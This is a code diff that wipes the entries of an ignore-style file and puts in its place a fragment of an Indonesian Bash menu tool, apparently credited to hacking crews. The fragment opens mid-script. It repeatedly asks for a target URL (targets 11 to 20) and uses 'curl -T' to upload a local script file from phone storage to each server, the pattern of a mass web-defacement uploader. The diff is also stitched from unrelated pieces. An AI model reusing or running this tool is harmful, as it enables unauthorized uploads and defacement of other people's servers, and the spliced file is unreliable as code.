@@ -1,13 +1,101 @@
-*.tar
-*.tar.*
-*.jar
-*.exe
-*.msi
-*.zip
-*.tgz
-*.log
-*.log.*
-*.sig
 
-pkg/
-src/
+"Masukan Target11 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
+echo "Masukan Target12 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
+echo "Masukan Target13 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
+echo "Masukan Target14 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
+echo "Masukan Target15 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
+echo "Masukan Target16 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
+echo "Masukan Target17 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
+echo "Masukan Target18 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
+echo "Masukan Target19 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
+echo "Masukan Target20 !!!! "
+echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "D" ] || [ $apaan = "d" ]
+then
+python2 AMR.py
+exit
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo $red"################# INFO ####################"
+echo $indigo"__________________________________________"
+echo $green"AUTHOR : AMRiezz                    "
+echo $purple"GITHUB : https://github.com/Amriez"
+echo $white"BLOG : http://anrwiki.blogspot.com"
+echo $yellow"             THANKS TO : "
+echo $cyan"[+] INDONESIAN SECURITY LITE "
+echo $cyan"[+] BAD BUNNY CYBER TEAM "
+echo $cyan"[+] RYUKI-KUN & MR.RSA & TEAM33MIRACLE & M3E.X "
+echo $red"################# INFO ####################"
+echo $indigo"__________________________________________"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+exit
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " :) "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh AOC.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
